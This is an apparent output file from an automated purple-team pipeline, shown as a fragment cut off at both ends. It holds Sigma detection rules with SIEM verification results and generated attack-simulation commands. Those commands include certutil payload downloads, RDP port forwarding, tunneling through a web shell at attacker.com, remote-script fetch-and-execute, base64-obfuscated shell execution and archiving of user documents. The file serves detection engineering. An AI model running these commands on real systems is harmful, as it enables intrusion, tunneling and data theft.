              "\\wmic.exe"
            ],
            "CommandLine|contains": [
              "New-Service",
              "sc create",
              "sc.exe create",
              "Win32_Service.Create",
              "CreateObject",
              "Method Create"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software installation",
          "System administration tasks"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1543"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "f3f7024a-3f9a-4a3c-ab8d-5a14704462ac",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 26,
          "query_time_ms": 574.0000000000001
        }
      },
      {
        "title": "Archive Collected Data via Compression Tools",
        "description": "Detects execution of common compression utilities or PowerShell Compress-Archive with archive file extensions, indicating possible staging of collected data for exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_tool": {
            "Image|endswith": "\\\\tar.exe"
          },
          "selection_tool2": {
            "Image|endswith": "\\\\7z.exe"
          },
          "selection_tool3": {
            "Image|endswith": "\\\\winrar.exe"
          },
          "selection_tool4": {
            "Image|endswith": "\\\\powershell.exe",
            "CommandLine|contains": "Compress-Archive"
          },
          "selection_flag": {
            "CommandLine|contains": [
              ".zip",
              ".rar",
              ".7z"
            ]
          },
          "condition": "(selection_tool or selection_tool2 or selection_tool3 or selection_tool4) and selection_flag"
        },
        "falsepositives": [
          "Legitimate backup or archiving scripts run by administrators",
          "System maintenance tasks that compress logs or files",
          "Windows built\u2011in compression utilities used by end users"
        ],
        "level": "high",
        "tags": [
          "attack.t1560",
          "attack.collection",
          "custom.process_creation",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "a7bb2ae9-5604-497b-9ffb-df4596f9a373",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 5,
          "query_time_ms": 1074.0
        }
      },
      {
        "title": "Windows Account Discovery via Command Line Utilities",
        "description": "Detects common command-line utilities used for account discovery such as net user, whoami, dsquery, and PowerShell Get-* cmdlets.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "cmd.exe",
              "powershell.exe",
              "whoami.exe",
              "dsquery.exe"
            ],
            "CommandLine|re": "(?i)(net\\s+(user|localgroup|group|session|user\\s+/domain)|whoami|dsquery\\s+user|Get-(LocalUser|ADUser|LocalGroupMember))"
          },
          "filter": {
            "ParentImage|endswith": [
              "explorer.exe",
              "svchost.exe",
              "mmc.exe"
            ]
          },
          "condition": "selection and not filter"
        },
        "falsepositives": [
          "Legitimate system administration using command-line tools",
          "Automated scripts or monitoring tools"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.t1087"
        ],
        "ttp_id": "unknown",
        "technique_name": "Account Discovery",
        "generation_method": "langchain",
        "id": "b55e2a7a-8ddf-4262-b1be-5a6f21d84d23",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Invalid SPL: Error in 'SearchOperator:regex': Usage: regex <field> (=|!=) <regex>.",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Registry Run Key Persistence via Command Line or Direct Write",
        "description": "Detects modifications to Windows Registry Run/RunOnce keys through command-line utilities or direct registry writes",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_reg_add": {
            "CommandLine|re": "(?i)^reg\\s+add\\s+.*\\\\(Software\\\\)?Microsoft\\\\)?Windows\\\\)?CurrentVersion\\\\)?Run(Once)?\\\\.*$",
            "Image|endswith": "\\reg.exe"
          },
          "selection_reg_write": {
            "EventID": 13,
            "TargetObject|re": "(?i)^HK(?:LM|CU|U|CR)\\\\Software\\\\(Microsoft\\\\)?Windows\\\\)?CurrentVersion\\\\)?Run(Once)?\\\\"
          },
          "exclusions": {
            "Image|endswith": [
              "\\MpCmdRun.exe",
              "\\vssvc.exe",
              "\\msiexec.exe"
            ],
            "User": "NT AUTHORITY\\SYSTEM"
          },
          "condition": "(selection_reg_add or selection_reg_write) and not exclusions"
        },
        "falsepositives": [
          "Legitimate software installers creating auto-start entries",
          "Enterprise management tools updating Run keys",
          "Signed Microsoft binaries performing maintenance tasks"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1547.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "langchain"
      },
      {
        "title": "Remote Desktop Protocol (RDP) Usage Detection",
        "description": "Detects execution of mstsc.exe (Remote Desktop Connection) and network connections to the default RDP port 3389, indicating possible lateral movement via Remote Desktop Protocol.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "mstsc_process": {
            "Image|endswith": "\\mstsc.exe"
          },
          "mstsc_cli": {
            "Image|endswith": "\\mstsc.exe",
            "CommandLine|contains": "/v:"
          },
          "rdp_network": {
            "DestinationPort": 3389,
            "Protocol": "tcp"
          },
          "condition": "1 of mstsc_process, mstsc_cli, rdp_network"
        },
        "falsepositives": [
          "Legitimate administrative use of Remote Desktop Connection (mstsc.exe) by IT staff.",
          "Remote support tools that use RDP (e.g., TeamViewer, AnyDesk) may also open port 3389.",
          "Authorized remote management scripts that invoke mstsc.exe."
        ],
        "level": "high",
        "tags": [
          "attack.t1021.001",
          "attack.lateral_movement",
          "attack.remote_services",
          "custom.technique"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "generation_method": "langchain",
        "id": "6a4c0471-b38b-498c-bef0-34a8b9e1c1d6",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 6,
          "query_time_ms": 450.0
        }
      },
      {
        "title": "Suspicious Office Application Spawning Command Shell",
        "description": "Detects Microsoft Office applications spawning command-line interpreters, a common pattern in phishing attacks using malicious documents.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_parent": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\OUTLOOK.EXE",
              "\\MSACCESS.EXE"
            ]
          },
          "selection_child": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\cscript.exe",
              "\\wscript.exe"
            ]
          },
          "selection_command": {
            "CommandLine|contains": [
              "-enc",
              "-e ",
              "/c",
              "iex",
              "Invoke-Expression",
              "Start-Process",
              "cmd /c",
              "powershell -c"
            ]
          },
          "condition": "selection_parent and selection_child and selection_command"
        },
        "falsepositives": [
          "Legitimate document automation using scripts (rare in most environments)",
          "Administrative or developer tools launched from Office documents (uncommon)",
          "User-initiated macro execution that spawns command-line tools for benign purposes"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1566",
          "attack.execution",
          "attack.t1059"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "91c133e3-c0b3-4b72-9059-15e67a8677be",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 26,
          "query_time_ms": 659.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.6817391304347826
    }
  },
  "attacks": [
    {
      "id": "48de3be7-f6eb-4d18-8c64-c506dd6f749d",
      "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_name": "Protocol Tunneling",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/tunna_agent.exe %TEMP%\\tunna.exe",
      "description": "Download a tunna-like agent binary from a remote server using certutil, a built-in Windows utility.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Downloads a file from the specified URL to the user's temp directory. No execution occurs. This simulates initial staging of a tunneling tool over HTTP.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.688467",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.717,
      "validated": true
    },
    {
      "id": "ed7c81f3-38fb-422e-82ea-07eeec6171df",
      "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_name": "Protocol Tunneling",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=127.0.0.1",
      "description": "Set up a port proxy to forward external connections on port 8080 to RDP (port 3389) locally, enabling indirect access via HTTP-adjacent ports.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a port forwarding rule that allows external systems to connect to port 8080 and be redirected to the local RDP service. Requires admin rights. Can be detected via netsh portproxy inspection.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.689482",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.717,
      "validated": true
    },
    {
      "id": "97a809c4-1dfe-46bd-b9e0-c14c65d3ac79",
      "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_name": "Protocol Tunneling",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c %TEMP%\\\\tunna.exe -tunnel 80 -target 127.0.0.1:3306' -WindowStyle Hidden\"",
      "description": "Execute a tunneled connection command via PowerShell to forward MySQL traffic over HTTP port using a simulated tunna agent.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Launches a hidden command prompt to run a tunneling agent that forwards MySQL traffic (port 3306) over port 80. Assumes tunna.exe was previously placed in temp. No actual payload is used; this is for simulation.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.689482",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.717,
      "validated": true
    },
    {
      "id": "50cf4e0a-d00c-449f-9a75-97cae531cb13",
      "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_name": "Protocol Tunneling",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "python3 /tmp/tunna.py -t 127.0.0.1 -p 22 -u http://attacker.com/shell.php",
      "description": "Basic Tunna web shell tunneling: forwards local SSH service over HTTP to external web shell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Establishes a tunnel from the target's localhost:22 through an HTTP web shell at attacker.com. Traffic is encapsulated in HTTP requests, bypassing firewall restrictions on direct SSH access.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.772437",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.717,
      "validated": true
    },
    {
      "id": "b80f96e2-832c-44c1-9bdf-9bf3887511ef",
      "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_name": "Protocol Tunneling",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "nohup python3 /tmp/tunna.py -t 127.0.0.1 -p 3306 -u http://attacker.com/shell.php > /tmp/tunna.log 2>&1 &",
      "description": "Intermediate Tunna tunneling with background execution and logging for MySQL service exposure",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Runs Tunna in the background, tunneling MySQL (port 3306) over HTTP. Output is logged to /tmp/tunna.log. Allows persistent access to internal database service via HTTP web shell.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.772437",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.717,
      "validated": true
    },
    {
      "id": "8d9d5799-75c5-420f-8880-7b5b8817e595",
      "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
      "technique_name": "Protocol Tunneling",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "echo 'bash -c \"python3 /tmp/tunna.py -t 127.0.0.1 -p 8000 -u http://attacker.com/shell.php\"' | /bin/sh",
      "description": "Advanced execution simulating encoded command injection to initiate Tunna tunneling for a local web server",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Simulates a command injection scenario where an encoded or obfuscated command starts a Tunna tunnel for a local service on port 8000. The use of echo and sh mimics exploitation through a vulnerable web parameter or script.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.772437",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.717,
      "validated": true
    },
    {
      "id": "317cd260-fd8f-4086-b541-730ee552452d",
      "ttp_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -decode \"%TEMP%\\payload.b64\" \"%TEMP%\\payload.bin\" && powershell -Command \"try { $enc = [System.IO.File]::ReadAllText('%TEMP%\\payload.bin'); $dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc)); iex $dec } catch { }\"",
      "description": "Decodes a base64-encoded 'encrypted' .NET payload and executes it via PowerShell command interpreter",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Simulates execution of an encrypted .NET payload by decoding a benign script from Base64 and invoking it through iex (Invoke-Expression). Uses certutil for decoding, then PowerShell for interpretation. No network activity occurs; files are local and temporary.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:58.374314",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "3708d99b-b5bd-4cd8-97e1-170bf1fbc1bc",
      "ttp_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\httpclient' -ErrorAction SilentlyContinue; $url = 'http://127.0.0.1:8080/payload'; try { $response = Invoke-WebRequest -Uri $url -UseBasicParsing; [System.IO.File]::WriteAllText('%TEMP%\\httpclient\\stage.ps1', $response.Content); . '%TEMP%\\httpclient\\stage.ps1' } catch { }\"",
      "description": "Fetches a remote script using PowerShell web client and sources it locally to simulate payload execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to retrieve a script from a local web server (simulated C2), saves it to a temp directory, and executes it in the current scope using dot-sourcing. Fails silently if server is unreachable. Directory creation uses error suppression for robustness.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:58.374314",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "502f66a1-2831-4e02-bc5d-8d565508906c",
      "ttp_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'echo \"Test execution from script\"' > /tmp/malicious.sh && chmod +x /tmp/malicious.sh && /bin/bash /tmp/malicious.sh",
      "description": "Basic execution of a script written to disk using bash interpreter",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a simple shell script in /tmp, makes it executable, and runs it. Outputs a test message to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:59.650568",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "84d6600a-245c-4529-9664-c02bf6c94713",
      "ttp_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'ZWNobyAiVGVzdCBiYXNlNjQgc2NyaXB0IHNob3J0IHNjcmlwdCIK | base64 -d | /bin/sh",
      "description": "Intermediate: Execute a base64-encoded command via shell interpreter",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a base64 string containing a simple echo command and pipes it to /bin/sh for execution. Outputs a test message.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:59.650568",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "f4cba90f-0c49-477b-ac36-933ec4884e9e",
      "ttp_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "TMP_FILE=$(mktemp --suffix=.sh) && echo 'echo \"Executing from temporary encoded script\"' > \"$TMP_FILE\" && chmod +x \"$TMP_FILE\" && \"$TMP_FILE\" 2>/dev/null || true && rm -f \"$TMP_FILE\" 2>/dev/null || true",
      "description": "Advanced: Use mktemp to create a temporary script file, write benign payload, execute, and clean up",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary .sh file via mktemp, writes a simple echo command, executes it silently, and removes the file. No persistent changes.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:59.650568",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "a20342d7-d95b-4e30-88e2-ea16705a2582",
      "ttp_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Gathering system info & systeminfo > %TEMP%\\sys_info.txt\"",
      "description": "Basic: Collect system information using built-in systeminfo command and save to temp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Runs systeminfo and writes output to %TEMP%\\sys_info.txt. No elevated privileges needed. File is created in user temp directory.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.816164",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "97c370d6-f00a-458d-bf56-65f4ac6c84d8",
      "ttp_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "windows",
      "command": "cmd.exe /c \"copy \"%USERPROFILE%\\Documents\\*.pdf\" \"%TEMP%\\collected_data\" /Y 2>NUL || mkdir \"%TEMP%\\collected_data\" && copy \"%USERPROFILE%\\Documents\\*.pdf\" \"%TEMP%\\collected_data\" /Y\"",
      "description": "Intermediate: Copy PDF documents from user's Documents folder to a temp subdirectory, creating it if needed",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to copy PDF files to %TEMP%\\collected_data. If directory doesn't exist, creates it and retries. Uses built-in copy command. No recursion, limited to user-accessible files.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.816164",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "7749fa9f-2df8-4ab8-8c0e-656d0899e05f",
      "ttp_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path $env:TEMP\\collected_data\\* -DestinationPath $env:TEMP\\archive.zip -Force -ErrorAction SilentlyContinue; certutil -urlcache -f https://127.0.0.1/stager.exe $env:TEMP\\stager.exe 2>$null\"",
      "description": "Advanced: Simulate exfiltration prep by compressing collected data and using certutil to stage a benign binary (simulated exfiltration vector)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a zip archive of collected data using Compress-Archive with -Force. Then uses certutil to simulate downloading a payload (to localhost for safety). The certutil command uses -f without -Force as per constraints and suppresses errors. No actual network exfiltration occurs.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:24.816671",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "03c4b233-d6d6-4731-a95a-0f1447f2de83",
      "ttp_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "linux",
      "command": "cp /home/user/Documents/*.pdf /tmp/collected_data/",
      "description": "Basic data collection: Copy PDF files from user's Documents to a temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Copies all .pdf files from the user's Documents folder to /tmp/collected_data/. No system-wide impact; limited to user-owned files.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.830524",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "131cfed6-1686-49e0-892c-667c10428eb2",
      "ttp_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
      "technique_name": "Data from Local System",
      "tactic": "Collection",
      "platform": "linux",
      "command": "find /home -type f -name '*.txt' -size -100k -exec tar -rf /tmp/user_texts.tar {} \\; && gzip /tmp/user_texts.tar",
      "description": "Advanced data collection: Find small text files across user directories and bundle them into a compressed archive.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Searches for text files under 100KB in /home, adds them to a tar archive, then compresses it with gzip. Minimizes performance impact by limiting file size and avoiding recursion outside /home.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:24:25.831531",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "f3d48d13-7e4e-42a5-9a8e-863d081d5539",
      "ttp_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
      "technique_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'VGhpcyBpcyBhIHRlc3Qgc3RyaW5n' | base64 -d > $HOME/.cache/.temp_data && cat $HOME/.cache/.temp_data",
      "description": "Basic obfuscation using base64 encoding to hide plain text in a hidden file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Decodes a base64 string and saves it to a hidden file in the user's cache directory, then displays its content. The content is a benign test string.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:37:32.967075",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "ab8aa4c3-e25a-447a-853d-0f56449a401d",
      "ttp_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
      "technique_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mkdir -p $HOME/.config/.tmp && echo 'string obfuscation layer one' | gzip | base64 > $HOME/.config/.tmp/.data.enc && base64 -d $HOME/.config/.tmp/.data.enc | gzip -d",
      "description": "Intermediate obfuscation using chained compression and encoding to obscure data",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a directory, compresses and encodes a test string into a file, then decodes and decompresses it to verify content. Simulates multi-layer obfuscation.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:37:32.967075",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "c210043a-604e-43d9-baa4-5271bb4df118",
      "ttp_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
      "technique_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo -n 'ZWNobyAnSGlkZGVuIG9wZXJhdGlvbjogcm1 -c' | rev | base64 -d | bash -s",
      "description": "Advanced obfuscation using reversed and encoded command string executed via shell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Reverses and decodes an obfuscated command string that executes a benign echo statement. Demonstrates execution of obfuscated shell commands without using PowerShell or external tools.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:37:32.967075",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "cebe157c-a229-4f01-a8b7-8d0745f5d636",
      "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "tasklist /V /FI \"STATUS eq RUNNING\" | findstr /I \"window\"",
      "description": "List running processes with verbose information and filter for those likely associated with application windows using built-in tasklist and findstr.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of running processes with window titles and status. Limited to console-visible windows and does not modify the system.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.280861",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "e8209160-33b6-4c79-9a8b-8e97ee3287d5",
      "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object ProcessName, Id, MainWindowTitle\"",
      "description": "Use PowerShell to query processes with non-empty main window titles, indicating interactive application windows.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays process name, ID, and window title for applications with visible windows. Uses standard PowerShell cmdlets without .NET reflection or unsafe operations.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.280861",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "97cc02af-2d5e-4746-a7d7-8de16065736f",
      "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"RwBlAHQALQBQcm9jAGUAcwBzACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAE0AYQBpAG4AVwBpAG4AZABvAHcAVABpAHQAbABlACAAfQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAUAByAG8AYwBlAHMAcwBOAGEAbQBlACwAIABJAGQALAAgAE0AYQBpAG4AVwBpAG4AZABvAHcAVABpAHQAbABlAA==\"",
      "description": "Execute a base64-encoded PowerShell command to discover application windows, simulating obfuscated command delivery.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and runs a PowerShell command that lists processes with window titles. The encoding simulates evasion techniques but performs the same safe operation as the intermediate example.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.280861",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "886689d7-9327-4ccc-ab65-73cf68cb22e1",
      "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "xwininfo -tree -root",
      "description": "Enumerate all top-level and child windows in the current X session using xwininfo",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a hierarchical tree of all open windows and their properties (like window IDs, geometry, and names) under the root window in the current X session",
      "source": "langchain",
      "generated_at": "2025-12-31T22:35:36.834255",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "267b24e1-2385-4ca4-ba75-d1f1836f1fc6",
      "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
      "technique_name": "Application Window Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "wmctrl -l",
      "description": "List all open windows with their titles and window IDs using wmctrl",
      "requires_admin": false,
      "safety_level": "low",
